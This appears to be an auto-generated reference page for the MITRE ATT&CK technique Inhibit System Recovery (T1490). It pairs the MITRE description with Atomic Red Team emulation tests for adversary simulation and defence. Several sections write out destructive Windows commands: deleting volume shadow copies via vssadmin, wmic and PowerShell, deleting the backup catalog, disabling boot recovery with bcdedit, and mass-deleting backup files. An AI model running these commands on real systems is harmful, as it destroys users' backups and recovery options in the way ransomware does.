
# Inhibit System Recovery

## Description

### MITRE Description

> Adversaries may delete or remove built-in operating system data and turn off services designed to aid in the recovery of a corrupted system to prevent recovery.(Citation: Talos Olympic Destroyer 2018)(Citation: FireEye WannaCry 2017) Operating systems may contain features that can help fix corrupted systems, such as a backup catalog, volume shadow copies, and automatic repair features. Adversaries may disable or delete system recovery features to augment the effects of [Data Destruction](https://attack.mitre.org/techniques/T1485) and [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486).(Citation: Talos Olympic Destroyer 2018)(Citation: FireEye WannaCry 2017)

A number of native Windows utilities have been used by adversaries to disable or delete system recovery features:

* <code>vssadmin.exe</code> can be used to delete all volume shadow copies on a system - <code>vssadmin.exe delete shadows /all /quiet</code>
* [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) can be used to delete volume shadow copies - <code>wmic shadowcopy delete</code>
* <code>wbadmin.exe</code> can be used to delete the Windows Backup Catalog - <code>wbadmin.exe delete catalog -quiet</code>
* <code>bcdedit.exe</code> can be used to disable automatic Windows recovery features by modifying boot configuration data - <code>bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no</code>

## Aliases

```

```

## Additional Attributes

* Bypass: None
* Effective Permissions: None
* Network: None
* Permissions: ['Administrator', 'root', 'SYSTEM', 'User']
* Platforms: ['Windows', 'macOS', 'Linux']
* Remote: None
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1490

## Potential Commands

```
vssadmin.exe delete shadows /all /quiet
del /s /f /q c:\*.VHD c:\*.bac c:\*.bak c:\*.wbcat c:\*.bkf c:\Backup*.* c:\backup*.* c:\*.set c:\*.win c:\*.dsk
Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();}
wmic.exe shadowcopy delete
bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures
bcdedit.exe /set {default} recoveryenabled no
wbadmin.exe delete catalog -quiet
```

## Commands Dataset

```
[{'command': 'vssadmin.exe delete shadows /all /quiet\n',
  'name': None,
  'source': 'atomics/T1490/T1490.yaml'},
 {'command': 'wmic.exe shadowcopy delete\n',
  'name': None,
  'source': 'atomics/T1490/T1490.yaml'},
 {'command': 'wbadmin.exe delete catalog -quiet\n',
  'name': None,
  'source': 'atomics/T1490/T1490.yaml'},
 {'command': 'bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures\n'
             'bcdedit.exe /set {default} recoveryenabled no\n',
  'name': None,
  'source': 'atomics/T1490/T1490.yaml'},
 {'command': 'Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();}\n',
  'name': None,
  'source': 'atomics/T1490/T1490.yaml'},
 {'command': 'del /s /f /q c:\\*.VHD c:\\*.bac c:\\*.bak c:\\*.wbcat c:\\*.bkf '
             'c:\\Backup*.* c:\\backup*.* c:\\*.set c:\\*.win c:\\*.dsk\n',
  'name': None,
  'source': 'atomics/T1490/T1490.yaml'}]
```

## Potential Detections

```json

```

## Potential Queries

```json

```

## Raw Dataset

```json
[{'Atomic Red Team Test - Inhibit System Recovery': {'atomic_tests': [{'auto_generated_guid': '43819286-91a9-4369-90ed-d31fb4da2c01',
                                                                       'dependencies': [{'description': 'Create '
                                                                                                        'volume '
                                                                                                        'shadow '
                                                                                                        'copy '
                                                                                                        'of '
                                                                                                        'C:\\ '
                                                                                                        '. '
                                                                                                        'This '
                                                                                                        'prereq '
                                                                                                        'command '
                                                                                                        'only '
                                                                                                        'works '
                                                                                                        'on '
                                                                                                        'Windows '
                                                                                                        'Server '
                                                                                                        'or '
                                                                                                        'Windows '
                                                                                                        '8.\n',
                                                                                         'get_prereq_command': 'vssadmin.exe '
                                                                                                               'create '
                                                                                                               'shadow '
                                                                                                               '/for=c:\n',
                                                                                         'prereq_command': 'if(!(vssadmin.exe '
                                                                                                           'list '
                                                                                                           'shadows '
                                                                                                           '| '
                                                                                                           'findstr '
                                                                                                           '"No '
                                                                                                           'items '
                                                                                                           'found '
                                                                                                           'that '
                                                                                                           'satisfy '
                                                                                                           'the '
                                                                                                           'query.")) '
                                                                                                           '{ '
                                                                                                           'exit '
                                                                                                           '0 '
                                                                                                           '} '
                                                                                                           'else '
                                                                                                           '{ '
                                                                                                           'exit '
                                                                                                           '1 '
                                                                                                           '}\n'}],
                                                                       'dependency_executor_name': 'powershell',
                                                                       'description': 'Deletes '
                                                                                      'Windows '
                                                                                      'Volume '
                                                                                      'Shadow '
                                                                                      'Copies. '
                                                                                      'This '
                                                                                      'technique '
                                                                                      'is '
                                                                                      'used '
                                                                                      'by '
                                                                                      'numerous '
                                                                                      'ransomware '
                                                                                      'families '
                                                                                      'and '
                                                                                      'APT '
                                                                                      'malware '
                                                                                      'such '
                                                                                      'as '
                                                                                      'Olympic '
                                                                                      'Destroyer. '
                                                                                      'Upon\n'
                                                                                      'execution, '
                                                                                      'if '
                                                                                      'no '
                                                                                      'shadow '
                                                                                      'volumes '
                                                                                      'exist '
                                                                                      'the '
                                                                                      'message '
                                                                                      '"No '
                                                                                      'items '
                                                                                      'found '
                                                                                      'that '
                                                                                      'satisfy '
                                                                                      'the '
                                                                                      'query." '
                                                                                      'will '
                                                                                      'be '
                                                                                      'displayed. '
                                                                                      'If '
                                                                                      'shadow '
                                                                                      'volumes '
                                                                                      'are '
                                                                                      'present, '
                                                                                      'it\n'
                                                                                      'will '
                                                                                      'delete '
                                                                                      'them '
                                                                                      'without '
                                                                                      'printing '
                                                                                      'output '
                                                                                      'to '
                                                                                      'the '
                                                                                      'screen. '
                                                                                      'This '
                                                                                      'is '
                                                                                      'because '
                                                                                      'the '
                                                                                      '/quiet '
                                                                                      'parameter '
                                                                                      'was '
                                                                                      'passed '
                                                                                      'which '
                                                                                      'also '
                                                                                      'suppresses '
                                                                                      'the '
                                                                                      'y/n\n'
                                                                                      'confirmation '
                                                                                      'prompt. '
                                                                                      'Shadow '
                                                                                      'copies '
                                                                                      'can '
                                                                                      'only '
                                                                                      'be '
                                                                                      'created '
                                                                                      'on '
                                                                                      'Windows '
                                                                                      'server '
                                                                                      'or '
                                                                                      'Windows '
                                                                                      '8.\n'
                                                                                      '\n'
                                                                                      'https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc788055(v=ws.11)\n',
                                                                       'executor': {'command': 'vssadmin.exe '
                                                                                               'delete '
                                                                                               'shadows '
                                                                                               '/all '
                                                                                               '/quiet\n',
                                                                                    'elevation_required': True,
                                                                                    'name': 'command_prompt'},
                                                                       'name': 'Windows '
                                                                               '- '
                                                                               'Delete '
                                                                               'Volume '
                                                                               'Shadow '
                                                                               'Copies',
                                                                       'supported_platforms': ['windows']},
                                                                      {'auto_generated_guid': '6a3ff8dd-f49c-4272-a658-11c2fe58bd88',
                                                                       'description': 'Deletes '
                                                                                      'Windows '
                                                                                      'Volume '
                                                                                      'Shadow '
                                                                                      'Copies '
                                                                                      'via '
                                                                                      'WMI. '
                                                                                      'This '
                                                                                      'technique '
                                                                                      'is '
                                                                                      'used '
                                                                                      'by '
                                                                                      'numerous '
                                                                                      'ransomware '
                                                                                      'families '
                                                                                      'and '
                                                                                      'APT '
                                                                                      'malware '
                                                                                      'such '
                                                                                      'as '
                                                                                      'Olympic '
                                                                                      'Destroyer.\n'
                                                                                      'Shadow '
                                                                                      'copies '
                                                                                      'can '
                                                                                      'only '
                                                                                      'be '
                                                                                      'created '
                                                                                      'on '
                                                                                      'Windows '
                                                                                      'server '
                                                                                      'or '
                                                                                      'Windows '
                                                                                      '8.\n',
                                                                       'executor': {'command': 'wmic.exe '
                                                                                               'shadowcopy '
                                                                                               'delete\n',
                                                                                    'elevation_required': True,
                                                                                    'name': 'command_prompt'},
                                                                       'name': 'Windows '
                                                                               '- '
                                                                               'Delete '
                                                                               'Volume '
                                                                               'Shadow '
                                                                               'Copies '
                                                                               'via '
                                                                               'WMI',
                                                                       'supported_platforms': ['windows']},
                                                                      {'auto_generated_guid': '263ba6cb-ea2b-41c9-9d4e-b652dadd002c',
                                                                       'description': 'Deletes '
                                                                                      'Windows '
                                                                                      'Backup '
                                                                                      'Catalog. '
                                                                                      'This '
                                                                                      'technique '
                                                                                      'is '
                                                                                      'used '
                                                                                      'by '
                                                                                      'numerous '
                                                                                      'ransomware '
                                                                                      'families '
                                                                                      'and '
                                                                                      'APT '
                                                                                      'malware '
                                                                                      'such '
                                                                                      'as '
                                                                                      'Olympic '
                                                                                      'Destroyer. '
                                                                                      'Upon '
                                                                                      'execution,\n'
                                                                                      '"The '
                                                                                      'backup '
                                                                                      'catalog '
                                                                                      'has '
                                                                                      'been '
                                                                                      'successfully '
                                                                                      'deleted." '
                                                                                      'will '
                                                                                      'be '
                                                                                      'displayed '
                                                                                      'in '
                                                                                      'the '
                                                                                      'PowerShell '
                                                                                      'session.\n',
                                                                       'executor': {'command': 'wbadmin.exe '
                                                                                               'delete '
                                                                                               'catalog '
                                                                                               '-quiet\n',
                                                                                    'elevation_required': True,
                                                                                    'name': 'command_prompt'},
                                                                       'name': 'Windows '
                                                                               '- '
                                                                               'Delete '
                                                                               'Windows '
                                                                               'Backup '
                                                                               'Catalog',
                                                                       'supported_platforms': ['windows']},
                                                                      {'auto_generated_guid': 'cf21060a-80b3-4238-a595-22525de4ab81',
                                                                       'description': 'Disables '
                                                                                      'repair '
                                                                                      'by '
                                                                                      'the '
                                                                                      'Windows '
                                                                                      'Recovery '
                                                                                      'Console '
                                                                                      'on '
                                                                                      'boot. '
                                                                                      'This '
                                                                                      'technique '
                                                                                      'is '
                                                                                      'used '
                                                                                      'by '
                                                                                      'numerous '
                                                                                      'ransomware '
                                                                                      'families '
                                                                                      'and '
                                                                                      'APT '
                                                                                      'malware '
                                                                                      'such '
                                                                                      'as '
                                                                                      'Olympic '
                                                                                      'Destroyer.\n'
                                                                                      'Upon '
                                                                                      'execution, '
                                                                                      '"The '
                                                                                      'operation '
                                                                                      'completed '
                                                                                      'successfully." '
                                                                                      'will '
                                                                                      'be '
                                                                                      'displayed '
                                                                                      'in '
                                                                                      'the '
                                                                                      'powershell '
                                                                                      'session.\n',
                                                                       'executor': {'cleanup_command': 'bcdedit.exe '
                                                                                                       '/set '
                                                                                                       '{default} '
                                                                                                       'bootstatuspolicy '
                                                                                                       'DisplayAllFailures '
                                                                                                       '>nul '
                                                                                                       '2>&1\n'
                                                                                                       'bcdedit.exe '
                                                                                                       '/set '
                                                                                                       '{default} '
                                                                                                       'recoveryenabled '
                                                                                                       'yes '
                                                                                                       '>nul '
                                                                                                       '2>&1\n',
                                                                                    'command': 'bcdedit.exe '
                                                                                               '/set '
                                                                                               '{default} '
                                                                                               'bootstatuspolicy '
                                                                                               'ignoreallfailures\n'
                                                                                               'bcdedit.exe '
                                                                                               '/set '
                                                                                               '{default} '
                                                                                               'recoveryenabled '
                                                                                               'no\n',
                                                                                    'elevation_required': True,
                                                                                    'name': 'command_prompt'},
                                                                       'name': 'Windows '
                                                                               '- '
                                                                               'Disable '
                                                                               'Windows '
                                                                               'Recovery '
                                                                               'Console '
                                                                               'Repair',
                                                                       'supported_platforms': ['windows']},
                                                                      {'auto_generated_guid': '39a295ca-7059-4a88-86f6-09556c1211e7',
                                                                       'description': 'Deletes '
                                                                                      'Windows '
                                                                                      'Volume '
                                                                                      'Shadow '
                                                                                      'Copies '
                                                                                      'with '
                                                                                      'PowerShell '
                                                                                      'code '
                                                                                      'and '
                                                                                      'Get-WMIObject.\n'
                                                                                      'This '
                                                                                      'technique '
                                                                                      'is '
                                                                                      'used '
                                                                                      'by '
                                                                                      'numerous '
                                                                                      'ransomware '
                                                                                      'families '
                                                                                      'such '
                                                                                      'as '
                                                                                      'Sodinokibi/REvil.\n'
                                                                                      'Executes '
                                                                                      'Get-WMIObject. '
                                                                                      'Shadow '
                                                                                      'copies '
                                                                                      'can '
                                                                                      'only '
                                                                                      'be '
                                                                                      'created '
                                                                                      'on '
                                                                                      'Windows '
                                                                                      'server '
                                                                                      'or '
                                                                                      'Windows '
                                                                                      '8, '
                                                                                      'so '
                                                                                      'upon '
                                                                                      'execution\n'
                                                                                      'there '
                                                                                      'may '
                                                                                      'be '
                                                                                      'no '
                                                                                      'output '
                                                                                      'displayed.\n',
                                                                       'executor': {'command': 'Get-WmiObject '
                                                                                               'Win32_Shadowcopy '
                                                                                               '| '
                                                                                               'ForEach-Object '
                                                                                               '{$_.Delete();}\n',
                                                                                    'elevation_required': True,
                                                                                    'name': 'powershell'},
                                                                       'name': 'Windows '
                                                                               '- '
                                                                               'Delete '
                                                                               'Volume '
                                                                               'Shadow '
                                                                               'Copies '
                                                                               'via '
                                                                               'WMI '
                                                                               'with '
                                                                               'PowerShell',
                                                                       'supported_platforms': ['windows']},
                                                                      {'auto_generated_guid': '6b1dbaf6-cc8a-4ea6-891f-6058569653bf',
                                                                       'description': 'Deletes '
                                                                                      'backup '
                                                                                      'files '
                                                                                      'in '
                                                                                      'a '
                                                                                      'manner '
                                                                                      'similar '
                                                                                      'to '
                                                                                      'Ryuk '
                                                                                      'ransomware. '
                                                                                      'Upon '
                                                                                      'exection, '
                                                                                      'many '
                                                                                      '"access '
                                                                                      'is '
                                                                                      'denied" '
                                                                                      'messages '
                                                                                      'will '
                                                                                      'appear '
                                                                                      'as '
                                                                                      'the '
                                                                                      'commands '
                                                                                      'try\n'
                                                                                      'to '
                                                                                      'delete '
                                                                                      'files '
                                                                                      'from '
                                                                                      'around '
                                                                                      'the '
                                                                                      'system.\n',
                                                                       'executor': {'command': 'del '
                                                                                               '/s '
                                                                                               '/f '
                                                                                               '/q '
                                                                                               'c:\\*.VHD '
                                                                                               'c:\\*.bac '
                                                                                               'c:\\*.bak '
                                                                                               'c:\\*.wbcat '
                                                                                               'c:\\*.bkf '
                                                                                               'c:\\Backup*.* '
                                                                                               'c:\\backup*.* '
                                                                                               'c:\\*.set '
                                                                                               'c:\\*.win '
                                                                                               'c:\\*.dsk\n',
                                                                                    'elevation_required': True,
                                                                                    'name': 'command_prompt'},
                                                                       'name': 'Windows '
                                                                               '- '
                                                                               'Delete '
                                                                               'Backup '
                                                                               'Files',
                                                                       'supported_platforms': ['windows']}],
                                                     'attack_technique': 'T1490',
                                                     'display_name': 'Inhibit '
                                                                     'System '
                                                                     'Recovery'}}]
```

# Tactics


* [Impact](../tactics/Impact.md)


# Mitigations


* [Inhibit System Recovery Mitigation](../mitigations/Inhibit-System-Recovery-Mitigation.md)

* [Operating System Configuration](../mitigations/Operating-System-Configuration.md)
    
* [Data Backup](../mitigations/Data-Backup.md)
    

# Actors

None
